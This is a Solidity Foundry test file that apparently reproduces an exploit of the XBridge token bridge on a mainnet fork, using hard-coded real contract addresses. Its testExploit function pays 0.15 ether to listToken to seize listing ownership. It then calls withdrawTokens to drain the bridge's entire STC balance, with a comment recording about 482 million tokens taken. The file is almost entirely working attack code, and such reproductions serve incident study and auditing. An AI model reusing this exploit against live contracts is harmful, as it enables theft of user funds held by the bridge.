// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "./ISTCToken.sol";
import "./IXbridge.sol";

IXbridge constant bridge = IXbridge(
    payable(0x47Ddb6A433B76117a98FBeAb5320D8b67D468e31)
);

ISTCToken constant STCToken = ISTCToken(
    payable(0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A)
);

contract XBridgeTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19723701 - 1);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("STC balance after", STCToken.balanceOf(address(this)), 9);

        XBridge.tokenInfo memory baseToken;
        baseToken.token = address(STCToken);
        baseToken.chain = 1;

        XBridge.tokenInfo memory correspondingToken;
        correspondingToken.token = address(STCToken);
        correspondingToken.chain = 2;

        // make owership
        bridge.listToken{value: 0.15 ether}(
            baseToken,
            correspondingToken,
            false
        );

        // withdraw all token
        uint256 amount = STCToken.balanceOf(address(bridge));
        bridge.withdrawTokens(address(STCToken), address(this), amount);

        // 482589886.903032631
        print("STC balance after", STCToken.balanceOf(address(this)), 9);
    }
}
